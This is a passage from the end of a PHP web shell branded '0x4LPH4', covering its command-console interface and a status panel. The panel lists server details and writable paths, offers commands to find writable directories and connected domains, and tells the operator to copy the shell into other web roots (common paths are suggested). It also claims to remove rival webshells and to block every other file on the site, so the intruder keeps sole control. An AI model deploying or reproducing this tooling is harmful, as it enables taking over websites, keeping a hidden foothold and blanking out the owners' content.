        $new_webshells = scanForWebshells();
        if (!empty($new_webshells)) {
            echo "\n<span class='cmd-error'>⚠ Controlled by 0x4LPH4: " . count($new_webshells) . " webshells neutralized!</span>\n";
        }
    }
}
?>
</pre>
    
    <div class="info-box">
        <h3>System Information & Security Status</h3>
        <?php
        echo "Script: " . $current_script . "<br>";
        echo "PHP Version: " . phpversion() . "<br>";
        echo "Server: " . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown') . "<br>";
        echo "Current Directory: " . getcwd() . "<br>";
        echo "Real Path: " . realpath(dirname(__FILE__)) . "<br>";
        echo "<strong>Current Writable Path:</strong> " . htmlspecialchars($_SESSION['writable_path']) . "<br>";
        
        echo "<strong>Security Status:</strong> ACTIVE<br>";
        echo "<strong>Files Blocked This Session:</strong> " . $blocked_files_count . "<br>";
        
        echo "<strong>Connected Domains:</strong><br>";
        if (!empty($connected_domains)) {
            foreach ($connected_domains as $domain) {
                echo "• " . htmlspecialchars($domain) . "<br>";
            }
        } else {
            echo "None detected<br>";
        }
        
        echo "<br><strong>🛡️ ACTIVE PROTECTION:</strong><br>";
        echo "• ALLOWED: 0x4LPH4.php, 0x4LPH4.html, 0x4LPH4.txt<br>";
        echo "• ALLOWED: index.php, index.html, index.htm<br>";
        echo "• BLOCKED: ALL other files (.txt, .html, .php, .jpg, etc.)<br>";
        echo "• AUTO-SECURE: When script is injected to new location<br>";
        echo "• BLANK PAGE: All blocked files show empty response<br>";
        
        if (!empty($detected_webshells)) {
            echo "<br><strong>Webshells Neutralized:</strong> " . count($detected_webshells) . "<br>";
        }
        
        echo "<br><strong>SPECIAL COMMANDS:</strong><br>";
        echo "• <code>findwritable</code> - Find all writable directories<br>";
        echo "• <code>finddomains</code> - Find all connected domains<br>";
        echo "• <code>setwritable /new/path</code> - Set new writable path<br>";
        echo "• <code>testwrite /path</code> - Test if path is writable<br>";
        echo "• <code>securepath /path</code> - Manually secure a path<br>";
        
        echo "<br><strong>MOVE/COPY 0X4LPH4 FILES:</strong><br>";
        echo "• <code>mv 0x4LPH4.php /var/www/html/admin/0x4LPH4.php</code><br>";
        echo "• <code>cp 0x4LPH4.php /home/user/public_html/0x4LPH4.php</code><br>";
        echo "<strong>Note:</strong> Target location auto-secures after move<br>";
        
        echo "<br><strong>COMMON PATHS TO TRY:</strong><br>";
        echo "• /var/www/html/<br>";
        echo "• /home/*/public_html/<br>";
        echo "• /home/*/domains/*/public_html/<br>";
        echo "• /tmp/<br>";
        echo "• /var/tmp/<br>";
        
        echo "<br><strong>SECURITY LOG:</strong><br>";
        echo "• Last security check: " . date('Y-m-d H:i:s') . "<br>";
        echo "• Files blocked: " . $blocked_files_count . "<br>";
        echo "• Protection: ACTIVE<br>";
        ?>
    </div>
    
    <script>
        // Auto-focus command input
        document.getElementById('cmd').focus();
        
        // Command history
        var commandHistory = [];
        var historyIndex = -1;
        
        document.getElementById('cmd').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                var cmd = this.value.trim();
                if (cmd) {
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                }
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (commandHistory.length > 0) {
                    if (historyIndex > 0) {
                        historyIndex--;
                    }
                    this.value = commandHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex] || '';
                } else {
                    historyIndex = commandHistory.length;
                    this.value = '';
                }
            }
        });
    </script>
</body>
</html>
